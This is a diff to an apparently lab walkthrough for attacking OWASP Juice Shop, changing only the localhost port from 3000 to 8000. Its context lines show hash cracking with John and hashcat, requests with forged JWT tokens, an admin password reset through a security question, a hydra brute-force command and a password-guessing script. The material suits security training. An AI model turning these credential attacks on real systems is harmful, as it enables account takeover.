@@ -54,7 +54,7 @@ john --format=raw-md5 --show hashes.txt
 
 ```bash
 # Login and capture token
-curl -X POST http://localhost:3000/rest/user/login \
+curl -X POST http://localhost:8000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"test@test.com","password":"test123"}' \
   -c cookies.txt -b cookies.txt
@@ -113,10 +113,10 @@ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 ### Testing Forged Token:
 
 ```bash
-curl http://localhost:3000/rest/user/whoami \
+curl http://localhost:8000/rest/user/whoami \
   -H "Authorization: Bearer <forged_token>"
 
-curl http://localhost:3000/api/Users/1 \
+curl http://localhost:8000/api/Users/1 \
   -H "Authorization: Bearer <forged_token>"
 ```
 
@@ -128,7 +128,7 @@ curl http://localhost:3000/api/Users/1 \
 
 ```bash
 # Get security questions for a user
-curl http://localhost:3000/api/SecurityQuestions
+curl http://localhost:8000/api/SecurityQuestions
 ```
 
 ### Answer for Admin Account:
@@ -138,7 +138,7 @@ curl http://localhost:3000/api/SecurityQuestions
 
 ```bash
 # Reset admin password
-curl -X POST http://localhost:3000/rest/user/reset-password \
+curl -X POST http://localhost:8000/rest/user/reset-password \
   -H "Content-Type: application/json" \
   -d '{
     "email": "admin@juice-sh.op",
@@ -187,7 +187,7 @@ hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \
 #!/usr/bin/env python3
 import requests
 
-url = "http://localhost:3000/rest/user/login"
+url = "http://localhost:8000/rest/user/login"
 email = "admin@juice-sh.op"
 passwords = ["admin123", "password", "admin", "12345", "juice"]
 
